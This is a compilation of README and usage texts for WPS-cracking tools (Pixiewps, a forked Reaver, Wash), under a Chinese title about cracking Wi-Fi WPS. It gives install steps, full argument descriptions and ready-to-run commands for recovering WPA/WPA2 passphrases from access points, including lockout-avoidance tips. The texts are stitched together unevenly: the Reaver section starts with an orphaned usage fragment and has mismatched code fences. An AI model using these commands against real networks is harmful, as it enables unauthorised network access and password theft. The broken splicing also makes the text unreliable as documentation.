# WIFI WPS 破解大法
# Pixiewps Overview
Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some APs (pixie dust attack). It is meant for educational purposes only. All credits for the research go to Dominique Bongard.

# DEPENDENCIES

Pixiewps requires libssl. To install it:

```bash
    sudo apt-get install libssl-dev
```

# INSTALLATION

Pixiewps can be built and installed by running:

```bash
    ~/pixiewps$ cd src
    ~/pixiewps/src$ make
    ~/pixiewps/src$ sudo make install
```

# USAGE

```bash
 Usage: pixiewps <arguments>

 Required Arguments:

    -e, --pke           : Enrollee public key
    -r, --pkr           : Registrar public key
    -s, --e-hash1       : Enrollee Hash1
    -z, --e-hash2       : Enrollee Hash2
    -a, --authkey       : Authentication session key

 Optional Arguments:

    -n, --e-nonce       : Enrollee nonce
    -m, --r-nonce       : Registrar nonce
    -b, --e-bssid       : Enrollee BSSID
    -S, --dh-small      : Small Diffie-Hellman keys (PKr not needed)   [No]
    -f, --force         : Bruteforce the whole keyspace                [No]
    -v, --verbosity     : Verbosity level 1-3, 1 is quietest            [3]

    -h, --help          : Display this usage screen
```

# USAGE EXAMPLE

A common usage example is:

```bash
    pixiewps --pke <pke> --pkr <pkr> --e-hash1 <e-hash1> --e-hash2 <e-hash2> --authkey <authkey> --e-nonce <e-nonce>
```

which requires a modified version of Reaver or Bully which prints *AuthKey*. The recommended version is [reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x).

If the following message is shown:

> [!] The AP /might be/ vulnerable. Try again with --force or with another (newer) set of data.

then the AP might be vulnerable and Pixiewps should be run again with the same set of data along with the option `--force` or alternatively with a newer set of data.

# DESCRIPTION OF ARGUMENTS

```bash
    -e, --pke

        Enrollee's DH public key, found in M1.

    -r, --pkr

        Registrar's DH public key, found in M2 or can be avoided by specifying
        --dh-small in both Reaver and Pixiewps.

    -s, --e-hash1

        Enrollee Hash-1, found in M3.

    -z, --e-hash2

        Enrollee Hash-2, found in M3.

    -a, --authkey

        Registration Protocol authentication session key. Although for this parameter a
        modified version of Reaver or Bully is needed, it can be avoided by specifying
        small Diffie-Hellman keys in both Reaver and Pixiewps and supplying --e-nonce,
        --r-nonce and --e-bssid.

    -n, --e-nonce

        Enrollee's nonce, found in M1.

    -m, --r-nonce

        Registrar's nonce, found in M2.

    -b, --e-bssid

        Enrollee's BSSID.

    -S, --dh-small

        Small Diffie-Hellman keys. The same option MUST be specified in Reaver
        (1.3 or later versions) too. This option should be avoided when possible.

    -f, --force

        Force Pixiewps to bruteforce the whole keyspace (only for one type of PRNG).
        It could take up to several minutes to complete.

    -v, --verbosity

        Verbosity level (1-3). Level 3 displays the most information.

    -h, --help

        Display usage screen.

# reaver-wps-fork-t6x Overview

**Reaver** has been designed to be a robust and practical attack against **Wi-Fi Protected Setup (WPS)** registrar PINs in order to **recover WPA/WPA2 passphrases**. It has been tested against a wide variety of access points and WPS implementations.

The **original** Reaver implements a **online brute force attack** against, as described in [http://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf](http://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf).
**reaver-wps-fork-t6x** is a **community forked version**, which has included **various bug fixes** and additional attack method (the **offline Pixie Dust** attack).

**Depending on the target's Access Point (AP)**, to recover the plain text WPA/WPA2 passphrase the **average** amount of time for the transitional **online brute force** method is **between 4-10 hours**. In practice, it will generally take half this time to guess the correct WPS pin and recover the passphrase.
When using the **offline attack**, **if** the AP is vulnerable, it may take only a matter of **seconds to minutes**.

* The original Reaver (v1.4) can be found here: [https://code.google.com/p/reaver-wps/](https://code.google.com/p/reaver-wps/).
* The discontinued community edition of Reaver (v1.5) that was used as the starting point: [https://code.google.com/p/reaver-wps-fork/](https://code.google.com/p/reaver-wps-fork/).

        -H, --pixiedust-log             Enables logging of sequence completed PixieHashes

Example:
        reaver -i wlan0mon -b 00:AA:BB:11:22:33 -vvv -K 1
```

## -K // --pixie-dust

The `-K 1` option performances the offline attack, Pixie Dust _(`pixiewps`)_, by automatically passing the **PKE**, **PKR**, **E-Hash1**, **E-Hash2**, **E-Nonce** and **Authkey** variables. `pixiewps` will then try to attack **Ralink**, **Broadcom** and **Realtek** detected chipset.
**Special note**: If you are attacking a **Realtek AP**, **do NOT** use small DH Keys (`-S`) option.

## -H // --pixiedust-log

The `-H` option is a switch to enable logging of PixieHashes, **saved hashes** will be saved in the **executing directory**.
This option requires you to have at the least `-vvv` switch on and will work with `-K 1` & `-P` appropriately.

The files saved are named after the bssid (MAC) of the target, and with an extention of `.pixie`.
On the inside of these saved logs, you will find all the required **PixieDust hashes**, along with a **quick copy & paste ready full command** to use it on `pixiewps`. You also have the option to execute it. Just pop in the file into your favorite shell, and execute it _(`chmod +x <filename>` may be required)_.

## -P // --pixiedust-loop

When using the `-P` option, Reaver goes into a loop mode that breaks the WPS protocol by not using M4 message to **hopefully avoid lockouts**.
This is to **ONLY** be used for PixieHash collecting to use with `pixiewps`, **NOT** to brute forcing 'online' pins.

This option was made with intent of:

* Collecting repetitive hashes for further comparison and or analysis / **discovery of new vulnerable chipsets**, routers etc..
* **Time sensitive attacks** where the hash collecting continues repetitively until your time frame is met.
* For **scripting purposes** of whom want to use a possible lockout preventable way of PixieHash gathering for your use case.

# Wash Usage

```
Wash v1.5.2 WiFi Protected Setup Scan Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212 & Wiire & kib0rg

Required Arguments:
        -i, --interface=<iface>              Interface to capture packets on
        -f, --file [FILE1 FILE2 FILE3 ...]   Read packets from capture files

Optional Arguments:
        -c, --channel=<num>                  Channel to listen on [auto]
        -o, --out-file=<file>                Write data to file
        -n, --probes=<num>                   Maximum number of probes to send to each AP in scan mode [15]
        -D, --daemonize                      Daemonize wash
        -C, --ignore-fcs                     Ignore frame checksum errors
        -5, --5ghz                           Use 5GHz 802.11 channels
        -s, --scan                           Use scan mode
        -u, --survey                         Use survey mode [default]
        -P, --file-output-piped              Allows Wash output to be piped. Example. wash x|y|z...
        -g, --get-chipset                    Pipes output and runs reaver alongside to get chipset
        -h, --help                           Show help

Example:
        wash -i wlan0mon
```

## -g // --get-chipset

The option `-g` of Wash, automatically runs Reaver to receive the chipset data.
**If** the AP does not respond to them quickly, this option will be **slow to display the data**, because Reaver will stay running until getting the data or until you reach your timeout limit (30 seconds).
